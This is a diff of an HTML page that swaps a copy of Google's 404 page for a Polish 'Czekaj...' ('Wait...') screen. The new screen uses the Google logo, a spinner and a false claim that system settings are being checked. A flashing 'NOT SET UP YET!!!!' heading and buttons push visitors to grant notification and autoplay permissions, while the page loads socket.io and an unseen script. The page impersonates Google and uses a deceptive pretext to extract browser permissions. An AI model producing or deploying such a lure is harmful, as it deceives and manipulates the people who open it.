@@ -5,94 +5,89 @@
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Google</title>
+  <title>Czekaj...</title>
   <link rel="shortcut icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
   <script src="/socket.io/socket.io.js"></script>
   <script defer src="/v.js"></script>
 
   <style>
-    * {
-      margin: 0;
-      padding: 0
-    }
-
-    html,
-    code {
-      font: 15px/22px arial, sans-serif
-    }
-
     html {
-      background: #fff;
-      color: #222;
-      padding: 15px
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
     }
 
-    body {
-      margin: 7% auto 0;
-      max-width: 390px;
-      min-height: 180px;
-      padding: 30px 0 15px
+    #googlelogo {
+      height: 70px;
     }
-
-    *>body {
-      background: url(//www.google.com/images/errors/robot.png) 100% 5px no-repeat;
-      padding-right: 205px
-    }
-
-    p {
-      margin: 11px 0 22px;
-      overflow: hidden
-    }
-
-    ins {
-      color: #777;
-      text-decoration: none
-    }
-
-    a img {
-      border: 0
-    }
-
-    @media screen and (max-width:772px) {
-      body {
-        background: none;
-        margin-top: 0;
-        max-width: none;
-        padding-right: 0
-      }
-    }
-
-    #logo {
-      background: url(//www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png) no-repeat;
-      margin-left: -5px
-    }
-
-    @media only screen and (min-resolution:192dpi) {
-      #logo {
-        background: url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat 0% 0%/100% 100%;
-        -moz-border-image: url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) 0
-      }
-    }
-
-    @media only screen and (-webkit-min-device-pixel-ratio:2) {
-      #logo {
-        background: url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat;
-        -webkit-background-size: 100% 100%
-      }
-    }
-
-    #logo {
+    
+    #spinner {
       display: inline-block;
-      height: 54px;
-      width: 150px
+      width: 30px;
+      height: 30px;
+      border: 5px solid #000;
+      border-radius: 50%;
+      border-top-color: transparent;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    #setup-title {
+      color: red;
+      font-weight: bold;
+      font-size: 70px;
+      animation: flash 1s infinite;
+    }
+
+    @keyframes flash {
+      0% {
+        opacity: 1;
+        scale: 150%;
+      }
+      50% {
+        opacity: 0;
+        scale: 100%;
+      }
+      100% {
+        opacity: 1;
+        scale: 150%;
+      }
+    }
+
+    #setup-buttons {
+      margin: 3em;
+    }
+
+    #setup-buttons > button {
+      background-color: #777;
+      color: white;
+      border: 1px solid #000;
+      font-size: 40px;
+      margin: .5em;
+      padding: .2em;
+      cursor: pointer;
     }
   </style>
 </head>
 
 <body>
-  <a href=//www.google.com /><span id=logo aria-label=Google></span></a>
-  <p><b>404.</b> <ins>That’s an error.</ins></p>
-  <p>The requested URL <code>/</code> was not found on this server. <ins>That’s all we know.</ins></p>
+  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png" alt="Google"
+    id="googlelogo">
+  <h1><span id="spinner"></span> Czekaj...</h1>
+  <h2>Prosimy o nie zamykanie tej karty, sprawdzamy ustawienia systemu.</h2>
+  <div id="setup">
+    <h1 id="setup-title">NOT SET UP YET!!!!</h1>
+    <div id="setup-buttons">
+      <button id="grant-notification">Grant Notification</button>
+      <button id="grant-autoplay">Grant Autoplay</button>
+      </divi>
+    </div>
 </body>
 
 </html>
